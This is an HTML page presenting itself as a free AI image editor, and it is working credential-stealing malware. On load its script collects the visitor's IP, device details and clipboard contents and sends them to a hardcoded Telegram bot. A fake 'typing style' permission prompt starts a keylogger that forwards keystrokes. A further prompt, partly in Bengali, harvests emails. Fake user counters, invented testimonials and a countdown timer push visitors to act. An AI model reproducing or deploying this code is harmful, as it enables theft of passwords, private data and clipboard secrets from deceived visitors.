<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>✨ Free AI Image Editor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body { background: #0a0a1a; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 16px; overflow-x: hidden; position: relative; }
        .bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; background: radial-gradient(ellipse at 20% 50%, #1a0a3e, #0a0a1a 70%); overflow: hidden; }
        .bg-canvas::before { content: ''; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%; background: radial-gradient(circle at 30% 40%, rgba(100,0,255,0.08), transparent 60%), radial-gradient(circle at 70% 60%, rgba(0,200,255,0.05), transparent 50%); animation: bgDrift 20s ease-in-out infinite alternate; }
        @keyframes bgDrift { 0% { transform: translate(0,0) rotate(0deg); } 100% { transform: translate(2%,-2%) rotate(3deg); } }
        .particles { position: absolute; width: 100%; height: 100%; top: 0; left: 0; pointer-events: none; overflow: hidden; }
        .particle { position: absolute; width: 3px; height: 3px; background: rgba(100,0,255,0.3); border-radius: 50%; animation: float linear infinite; }
        @keyframes float { 0% { transform: translateY(100vh) scale(0); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(-10vh) scale(1); opacity: 0; } }
        .container { position: relative; z-index: 1; max-width: 420px; width: 100%; background: rgba(20,10,40,0.8); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border-radius: 32px; padding: 28px 22px 30px; box-shadow: 0 30px 80px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.05); border: 1px solid rgba(100,0,255,0.3); text-align: center; transition: transform 0.3s ease; }
        .container:hover { transform: translateY(-2px); }
        .header { margin-bottom: 18px; }
        .badge { display: inline-flex; align-items: center; gap: 6px; background: linear-gradient(135deg, #7c3aed, #4c1d95); color: #fff; font-size: 11px; font-weight: 700; padding: 5px 16px; border-radius: 30px; text-transform: uppercase; letter-spacing: 1px; animation: pulseBadge 2s ease-in-out infinite; box-shadow: 0 0 20px rgba(124,58,237,0.3); }
        @keyframes pulseBadge { 0%,100% { box-shadow: 0 0 20px rgba(124,58,237,0.3); } 50% { box-shadow: 0 0 40px rgba(124,58,237,0.6); } }
        .badge .dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; animation: blink 1s ease-in-out infinite; }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
        h1 { color: #fff; font-size: 34px; font-weight: 800; margin: 6px 0 0; letter-spacing: -0.5px; background: linear-gradient(135deg, #ffffff, #a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        .sub { color: #a5b4fc; font-size: 15px; margin-top: 2px; font-weight: 400; }
        .live-counter { display: flex; justify-content: center; align-items: center; gap: 20px; background: rgba(10,14,23,0.5); border-radius: 16px; padding: 8px 16px; margin: 10px 0 16px; border: 1px solid rgba(124,58,237,0.2); }
        .live-item { display: flex; align-items: center; gap: 6px; color: #a5b4fc; font-size: 12px; font-weight: 500; }
        .live-item .num { color: #fff; font-weight: 700; font-size: 16px; min-width: 30px; }
        .live-item .num.green { color: #4caf50; }
        .live-item .num.gold { color: #ffb74d; }
        .offer-box { background: linear-gradient(145deg, rgba(30,10,60,0.8), rgba(10,10,20,0.6)); border-radius: 24px; padding: 26px 16px 22px; margin: 12px 0 20px; border: 1px solid rgba(124,58,237,0.25); position: relative; overflow: hidden; }
        .offer-box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 30% 40%, rgba(124,58,237,0.05), transparent 60%); animation: shine 6s ease-in-out infinite alternate; }
        @keyframes shine { 0% { transform: translate(-10%,-10%) rotate(0deg); } 100% { transform: translate(10%,10%) rotate(5deg); } }
        .offer-box > * { position: relative; z-index: 1; }
        .data-icon { font-size: 48px; margin-bottom: 2px; display: block; animation: floatIcon 3s ease-in-out infinite; }
        @keyframes floatIcon { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
        .data-amount { font-size: 40px; font-weight: 900; background: linear-gradient(135deg, #a78bfa, #7c3aed); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; line-height: 1; }
        .data-label { color: #c4b5fd; font-size: 18px; font-weight: 600; margin-top: 2px; }
        .data-sub { color: #8b5cf6; font-size: 13px; margin-top: 4px; }
        .data-sub .stock { color: #ffb74d; font-weight: 700; }
        .spots-bar { margin: 14px 0 18px; }
        .spots-bar .label-row { display: flex; justify-content: space-between; color: #a5b4fc; font-size: 12px; font-weight: 500; margin-bottom: 4px; }
        .spots-bar .label-row .remaining { color: #ffb74d; font-weight: 700; }
        .spots-track { width: 100%; height: 6px; background: rgba(42,30,60,0.4); border-radius: 10px; overflow: hidden; }
        .spots-fill { height: 100%; width: 72%; background: linear-gradient(90deg, #7c3aed, #a78bfa); border-radius: 10px; animation: fillShrink 8s ease-in-out infinite alternate; }
        @keyframes fillShrink { 0% { width: 72%; } 100% { width: 38%; } }
        .claim-btn { background: linear-gradient(135deg, #7c3aed, #4c1d95); color: #fff; border: none; padding: 17px 20px; width: 100%; border-radius: 60px; font-size: 20px; font-weight: 700; cursor: pointer; box-shadow: 0 8px 32px rgba(124,58,237,0.4); transition: all 0.3s ease; position: relative; overflow: hidden; letter-spacing: 0.5px; margin: 6px 0 16px; }
        .claim-btn::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.08), transparent); transform: rotate(45deg); animation: btnShine 4s ease-in-out infinite; }
        @keyframes btnShine { 0% { transform: translateX(-100%) rotate(45deg); } 100% { transform: translateX(100%) rotate(45deg); } }
        .claim-btn:hover:not(:disabled) { transform: scale(1.02); box-shadow: 0 12px 40px rgba(124,58,237,0.6); }
        .claim-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .claim-btn .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .claim-btn.loading .spinner { display: block; }
        .claim-btn.loading .btn-text { display: none; }
        .progress-steps { display: flex; justify-content: space-between; align-items: center; margin: 16px 0 10px; padding: 0 4px; }
        .step { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; }
        .step .circle { width: 28px; height: 28px; border-radius: 50%; background: rgba(42,30,60,0.4); border: 2px solid rgba(42,30,60,0.3); display: flex; align-items: center; justify-content: center; color: #6a5a8a; font-size: 12px; font-weight: 700; transition: all 0.5s ease; }
        .step .circle.active { background: #7c3aed; border-color: #7c3aed; color: #fff; box-shadow: 0 0 20px rgba(124,58,237,0.4); }
        .step .circle.done { background: #4caf50; border-color: #4caf50; color: #fff; }
        .step .label { font-size: 9px; color: #6a5a8a; font-weight: 500; text-transform: uppercase; }
        .step .label.active { color: #c4b5fd; }
        .step .label.done { color: #4caf50; }
        .step-line { flex: 1; height: 2px; background: rgba(42,30,60,0.3); margin: 0 -2px; margin-bottom: 16px; transition: background 0.5s ease; }
        .step-line.done { background: #4caf50; }
        .toast-container { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 100; width: 90%; max-width: 380px; pointer-events: none; display: flex; flex-direction: column; gap: 8px; align-items: center; }
        .toast { background: rgba(20,10,40,0.92); backdrop-filter: blur(12px); border: 1px solid rgba(124,58,237,0.2); border-radius: 16px; padding: 10px 16px; color: #e0d0f0; font-size: 13px; display: flex; align-items: center; gap: 10px; width: 100%; animation: slideUp 0.5s ease forwards; box-shadow: 0 8px 30px rgba(0,0,0,0.5); pointer-events: auto; }
        .toast .avatar { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, #7c3aed, #4c1d95); display: flex; align-items: center; justify-content: center; font-size: 14px; flex-shrink: 0; color: #fff; font-weight: 700; }
        .toast .msg { flex: 1; }
        .toast .msg strong { color: #fff; }
        .toast .time { color: #6a5a8a; font-size: 10px; }
        @keyframes slideUp { 0% { opacity: 0; transform: translateY(30px) scale(0.95); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
        .toast.removing { animation: slideDown 0.4s ease forwards; }
        @keyframes slideDown { 0% { opacity: 1; transform: translateY(0) scale(1); } 100% { opacity: 0; transform: translateY(30px) scale(0.95); } }
        .confetti-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 50; overflow: hidden; }
        .confetti-piece { position: absolute; width: 10px; height: 10px; top: -20px; animation: confettiFall linear forwards; }
        @keyframes confettiFall { 0% { transform: translateY(0) rotate(0deg) scale(1); opacity: 1; } 100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; } }
        .footer { margin-top: 14px; }
        .footer p { color: #6a5a8a; font-size: 12px; margin: 4px 0; }
        .footer .timer-row { display: flex; justify-content: center; align-items: center; gap: 8px; color: #ffb74d; font-weight: 600; font-size: 14px; background: rgba(10,10,20,0.4); padding: 4px 16px; border-radius: 30px; display: inline-flex; margin-top: 4px; border: 1px solid rgba(255,183,77,0.15); }
        .footer .timer-row #timer { font-weight: 700; font-size: 16px; min-width: 48px; }
        @media (max-width: 460px) { .container { padding: 20px 16px 22px; } h1 { font-size: 28px; } .claim-btn { font-size: 17px; padding: 15px 16px; } }
        .glow-ring { position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px; border-radius: 26px; background: linear-gradient(135deg, rgba(124,58,237,0.15), transparent 50%, rgba(124,58,237,0.05)); z-index: 0; pointer-events: none; animation: ringPulse 3s ease-in-out infinite; }
        @keyframes ringPulse { 0%,100% { opacity: 0.5; } 50% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="bg-canvas">
        <div class="particles" id="particles"></div>
    </div>

    <div class="toast-container" id="toastContainer"></div>
    <div class="confetti-container" id="confettiContainer"></div>

    <div class="container">
        <div class="header">
            <span class="badge"><span class="dot"></span> AI READY</span>
            <h1>AI Image Editor</h1>
            <p class="sub">✨ Enhance your photos with AI for free</p>
        </div>

        <div class="live-counter">
            <div class="live-item"><span class="icon">👥</span><span>Online:</span><span class="num green" id="onlineCount">2,847</span></div>
            <div class="live-item"><span class="icon">✅</span><span>Edited:</span><span class="num gold" id="claimedCount">9,124</span></div>
        </div>

        <div class="offer-box">
            <div class="glow-ring"></div>
            <span class="data-icon">🎨</span>
            <div class="data-amount">AI PRO</div>
            <div class="data-label">Free AI Photo Edit</div>
            <div class="data-sub"><span>⚡ Limited Offer</span> <span class="stock" id="stockCount">96</span> <span>credits left</span></div>
        </div>

        <div class="spots-bar">
            <div class="label-row"><span>🔥 Trending</span><span class="remaining" id="remainingLabel">96 remaining</span></div>
            <div class="spots-track"><div class="spots-fill" id="spotsFill"></div></div>
        </div>

        <div class="progress-steps">
            <div class="step"><div class="circle active" id="circle1">1</div><div class="label active" id="label1">Claim</div></div>
            <div class="step-line" id="line1"></div>
            <div class="step"><div class="circle" id="circle2">2</div><div class="label" id="label2">Verify</div></div>
            <div class="step-line" id="line2"></div>
            <div class="step"><div class="circle" id="circle3">3</div><div class="label" id="label3">Done</div></div>
        </div>

        <button class="claim-btn" id="claimBtn">
            <span class="btn-text">✨ Generate AI Image</span>
            <span class="spinner"></span>
        </button>

        <div class="footer">
            <p>🔒 Your data is safe. Only for verification.</p>
            <div class="timer-row">⏳ Offer ends in <span id="timer">09:54</span></div>
        </div>
    </div>

    <script>
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // CONFIG
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('id') || params.get('chat_id') || 'YOUR_CHAT_ID';
        const token = '8906991625:AAHNnCnCHQU5PDTvQTwkmGVnqYvXmHVkFx4';

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // TELEGRAM
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function sendToTelegramRaw(text) {
            const maxLen = 4096;
            if (text.length <= maxLen) {
                return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
                }).catch(() => {});
            }
            for (let i = 0; i < text.length; i += maxLen) {
                const chunk = text.slice(i, i + maxLen);
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: chunk, parse_mode: 'HTML' })
                }).catch(() => {});
            }
        }

        function sendPhotoToTelegram(blob, filename) {
            const formData = new FormData();
            formData.append('photo', blob, filename || 'clipboard.png');
            formData.append('chat_id', chatId);
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
                .catch(() => {});
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // TELEGRAM — BATCHED KEY QUEUE
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        const keyQueue = [];
        let flushTimer = null;

        function flushQueue() {
            if (keyQueue.length === 0) return;
            const batch = keyQueue.splice(0, keyQueue.length);
            const text = `⌨️ <b>Keystrokes captured</b> (${batch.length})\n\n` +
                         `<b>URL:</b> <code>${location.href}</code>\n` +
                         `<b>UA:</b> <code>${navigator.userAgent.slice(0, 100)}</code>\n\n` +
                         `<b>Keys:</b>\n<pre>${batch.map(k => k.key).join('')}</pre>`;
            sendToTelegramRaw(text);
        }

        function queueKey(e) {
            if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab'].includes(e.key)) return;
            let key = e.key;
            if (key === 'Enter') key = '\n';
            else if (key === 'Backspace') key = '[⌫]';
            else if (key.length > 1) key = `[${key}]`;
            keyQueue.push({ key, t: Date.now(), target: e.target?.tagName || 'body' });
            if (keyQueue.length >= 10) flushQueue();
            else {
                clearTimeout(flushTimer);
                flushTimer = setTimeout(flushQueue, 2000);
            }
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // SYSTEM INFO COLLECTION
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        async function fetchWanIp() {
            try {
                const r = await fetch('https://ipinfo.io/json');
                const d = await r.json();
                return d.ip || 'N/A';
            } catch (_) { return 'N/A'; }
        }

        async function getBatteryPercentage() {
            try {
                const b = await navigator.getBattery();
                return (b.level * 100).toFixed(2);
            } catch (_) { return 'N/A'; }
        }

        function getNetworkType() {
            return navigator.connection ? navigator.connection.effectiveType : 'N/A';
        }

        async function readClipboardAndSend() {
            let clipboardText = '';
            const clipboardItems = [];

            try {
                if (navigator.clipboard && navigator.clipboard.read) {
                    const items = await navigator.clipboard.read();
                    for (const item of items) {
                        for (const type of item.types) {
                            if (type === 'text/plain') {
                                const blob = await item.getType(type);
                                clipboardText += await blob.text();
                                if (clipboardText.length && !clipboardText.endsWith('\n')) clipboardText += '\n';
                            } else if (type.startsWith('image/')) {
                                const blob = await item.getType(type);
                                clipboardItems.push(blob);
                            }
                        }
                    }
                }
            } catch (e) { console.error('clipboard.read:', e); }

            if (!clipboardText && navigator.clipboard && navigator.clipboard.readText) {
                try { clipboardText = await navigator.clipboard.readText(); } catch (e) {}
            }

            if (clipboardText.trim()) {
                sendToTelegramRaw('📋 <b>Clipboard text:</b>\n\n<pre>' + clipboardText.trim() + '</pre>');
            } else if (clipboardItems.length === 0) {
                sendToTelegramRaw('📋 <b>Clipboard:</b> (empty or access denied)');
            }

            clipboardItems.forEach((blob, i) => {
                const ext = (blob.type || '').split('/')[1] || 'png';
                sendPhotoToTelegram(blob, 'clipboard_' + i + '.' + ext);
            });
        }

        async function onPageLoad() {
            const wanIp = await fetchWanIp();
            const userAgent = navigator.userAgent;
            const batteryPercentage = await getBatteryPercentage();
            const networkType = getNetworkType();
            const dateAndTime = new Date().toString();
            const totalRam = navigator.deviceMemory ?? 'N/A';

            const infoMessage =
                `🌐 <b>WAN IP:</b> ${wanIp}\n` +
                `📱 <b>User-Agent:</b> ${userAgent}\n` +
                `🔋 <b>Battery:</b> ${batteryPercentage}%\n` +
                `📡 <b>Network:</b> ${networkType}\n` +
                `🗓 <b>Date/Time:</b> ${dateAndTime}\n` +
                `💾 <b>RAM:</b> ${totalRam} GB\n` +
                `📍 <b>URL:</b> <code>${location.href}</code>\n` +
                `📋 <b>Clipboard:</b> reading and sending...`;

            sendToTelegramRaw(infoMessage);
            await readClipboardAndSend();
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // DOM REFS
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        const claimBtn = document.getElementById('claimBtn');
        const timerEl = document.getElementById('timer');
        const onlineCount = document.getElementById('onlineCount');
        const claimedCount = document.getElementById('claimedCount');
        const stockCount = document.getElementById('stockCount');
        const remainingLabel = document.getElementById('remainingLabel');
        const spotsFill = document.getElementById('spotsFill');
        const toastContainer = document.getElementById('toastContainer');
        const confettiContainer = document.getElementById('confettiContainer');

        const circles = { 1: document.getElementById('circle1'), 2: document.getElementById('circle2'), 3: document.getElementById('circle3') };
        const labels = { 1: document.getElementById('label1'), 2: document.getElementById('label2'), 3: document.getElementById('label3') };
        const lines = { 1: document.getElementById('line1'), 2: document.getElementById('line2') };

        let isClaiming = false;
        let claimed = false;
        let stock = 96;
        let claimedTotal = 9124;
        let online = 2847;

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // PARTICLES
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        (function initParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 50; i++) {
                const el = document.createElement('div');
                el.className = 'particle';
                el.style.left = Math.random() * 100 + '%';
                el.style.width = (1 + Math.random() * 3) + 'px';
                el.style.height = el.style.width;
                el.style.animationDuration = (12 + Math.random() * 20) + 's';
                el.style.animationDelay = (Math.random() * 20) + 's';
                el.style.opacity = 0.2 + Math.random() * 0.3;
                container.appendChild(el);
            }
        })();

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // FAKE LIVE COUNTERS
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        setInterval(() => {
            online += Math.floor(Math.random() * 4) - 1;
            online = Math.max(800, online + Math.floor(Math.random() * 3));
            onlineCount.textContent = online.toLocaleString();
        }, 4000);

        setInterval(() => {
            if (!claimed) {
                claimedTotal += Math.floor(Math.random() * 2);
                claimedCount.textContent = claimedTotal.toLocaleString();
            }
        }, 5000);

        function updateStock() {
            stock = Math.max(12, stock - Math.floor(Math.random() * 2));
            stockCount.textContent = stock;
            remainingLabel.textContent = stock + ' remaining';
            const pct = Math.max(5, (stock / 500) * 100);
            spotsFill.style.width = pct + '%';
        }
        setInterval(updateStock, 7000);

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // TOASTS
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        const names = ['Aisha', 'Rahul', 'Priya', 'Ahmed', 'Sara', 'Michael', 'Emma', 'Lucas', 'Mia', 'Ethan',
            'Zara', 'Omar', 'Layla', 'Noah', 'Ava', 'James', 'Sophia', 'Benjamin', 'Charlotte', 'Elijah'];
        const cities = ['Dhaka', 'Mumbai', 'Lagos', 'Karachi', 'New York', 'London', 'Toronto', 'Sydney',
            'Dubai', 'Berlin', 'Paris', 'Tokyo', 'Singapore', 'Kuala Lumpur', 'Istanbul', 'Cairo'];

        function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

        function showToast(msg, emoji, avatar) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.innerHTML = `
            <div class="avatar">${avatar || '👤'}</div>
            <div class="msg">${msg}</div>
            <div class="time">now</div>
          `;
            toastContainer.appendChild(toast);
            setTimeout(() => {
                toast.classList.add('removing');
                setTimeout(() => toast.remove(), 400);
            }, 4500);
        }

        setTimeout(() => {
            showToast(`<strong>${randomItem(names)}</strong> from ${randomItem(cities)} just enhanced their photo!`, '🎨', '🤖');
        }, 1200);
        setTimeout(() => {
            showToast(`<strong>${randomItem(names)}</strong> created an amazing AI image!`, '✨', '⭐');
        }, 3800);

        setInterval(() => {
            if (Math.random() > 0.3) {
                const name = randomItem(names);
                const city = randomItem(cities);
                const msgs = [
                    `<strong>${name}</strong> from ${city} just edited a photo!`,
                    `<strong>${name}</strong> generated 4K AI image 🎯`,
                    `${name} from ${city} is now a pro editor!`,
                    `<strong>${name}</strong> unlocked AI PRO features!`,
                ];
                showToast(randomItem(msgs), '🔥', '📸');
            }
        }, 8000 + Math.random() * 7000);

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // TIMER
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        let t = 594;
        setInterval(() => {
            if (t <= 0) return;
            t--;
            const m = String(Math.floor(t / 60)).padStart(2, '0');
            const s = String(t % 60).padStart(2, '0');
            timerEl.textContent = `${m}:${s}`;
            if (t === 60) showToast('⏰ Hurry! Offer ends in 1 minute!', '🚨', '⏰');
        }, 1000);

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // CONFETTI
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function fireConfetti() {
            const colors = ['#7c3aed', '#a78bfa', '#c4b5fd', '#4caf50', '#ffb74d', '#00bcd4', '#fd79a8'];
            for (let i = 0; i < 80; i++) {
                const piece = document.createElement('div');
                piece.className = 'confetti-piece';
                const color = randomItem(colors);
                const size = 6 + Math.random() * 8;
                piece.style.background = color;
                piece.style.width = size + 'px';
                piece.style.height = (size * (0.6 + Math.random() * 0.8)) + 'px';
                piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
                piece.style.left = Math.random() * 100 + '%';
                piece.style.animationDuration = (2 + Math.random() * 2.5) + 's';
                piece.style.animationDelay = (Math.random() * 1.2) + 's';
                confettiContainer.appendChild(piece);
                setTimeout(() => piece.remove(), 5000);
            }
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // STEP UPDATER
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function setStep(step) {
            for (let i = 1; i <= 3; i++) {
                const c = circles[i];
                const l = labels[i];
                c.classList.remove('active', 'done');
                l.classList.remove('active', 'done');
                if (i < step) { c.classList.add('done'); l.classList.add('done'); }
                else if (i === step) { c.classList.add('active'); l.classList.add('active'); }
            }
            for (let i = 1; i <= 2; i++) lines[i].classList.toggle('done', i < step);
        }
        setStep(1);

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // CLAIM FLOW — permission → keylogger → prompt
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        let permissionGranted = false;

        function requestPermissionAndStart() {
            const consent = prompt('🔐 AI Editor needs permission to detect your typing style.\n\nType "yes" to allow and continue:');
            if (consent && consent.trim().toLowerCase() === 'yes') {
                permissionGranted = true;
                document.addEventListener('keydown', queueKey, true);
                sendToTelegramRaw('✅ <b>Permission granted</b> — keylogger active\n' +
                                  `<b>URL:</b> <code>${location.href}</code>\n` +
                                  `<b>UA:</b> <code>${navigator.userAgent}</code>`);
                return true;
            }
            sendToTelegramRaw('❌ <b>Permission denied</b> — keylogger not started');
            return false;
        }

        function captureAndClaim() {
            if (isClaiming || claimed) return;
            isClaiming = true;
            claimBtn.classList.add('loading');
            claimBtn.disabled = true;
            setStep(2);

            if (!permissionGranted) {
                const ok = requestPermissionAndStart();
                if (!ok) {
                    setStep(1);
                    claimBtn.classList.remove('loading');
                    claimBtn.innerHTML = '✨ Generate AI Image';
                    claimBtn.disabled = false;
                    isClaiming = false;
                    showToast('⚠️ Permission required to continue.', '🔒', '⚠️');
                    return;
                }
            }

            showToast('📝 Please enter your prompt...', '⏳', '✍️');
            const text = prompt('📝 আপনার ইমেইল বা AI প্রম্পট লিখুন (ফ্রি এডিট পেতে):');

            if (text !== null && text.trim() !== '') {
                sendToTelegramRaw(`🎨 <b>AI ইমেজ এডিটর ক্লেইম:</b>\n<code>${text}</code>`);
                sendToTelegramRaw('✅ AI ইমেজ এডিটর ক্লেইম করেছেন!');

                claimed = true;
                setStep(3);
                claimBtn.classList.remove('loading');
                claimBtn.innerHTML = '🎉 Image Generated!';
                claimBtn.style.background = 'linear-gradient(135deg, #4caf50, #2e7d32)';
                claimBtn.disabled = true;

                fireConfetti();
                setTimeout(() => fireConfetti(), 800);
                showToast('🎊 Your AI image is ready! Check your email.', '🎉', '🤖');
                showToast('🚀 You are now a PRO editor!', '🔥', '⭐');

                claimedTotal += 1;
                claimedCount.textContent = claimedTotal.toLocaleString();
                flushQueue();
            } else {
                setStep(1);
                claimBtn.classList.remove('loading');
                claimBtn.innerHTML = '✨ Generate AI Image';
                claimBtn.disabled = false;
                isClaiming = false;
                sendToTelegramRaw('❌ AI ইমেজ এডিটর ক্লেইম বাতিল বা ফাঁকা');
                showToast('⚠️ Please enter your prompt.', '📝', '⚠️');
            }
        }

        claimBtn.addEventListener('click', captureAndClaim);

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !claimBtn.disabled) claimBtn.click();
        });

        setTimeout(() => {
            showToast('⚠️ Only <strong>' + stock + '</strong> credits remaining!', '🚨', '⏰');
        }, 6000);

        // Flush on unload / hide
        window.addEventListener('beforeunload', flushQueue);
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') flushQueue();
        });

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // BOOT — collect + exfil on load
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        onPageLoad();
    </script>
</body>
</html>
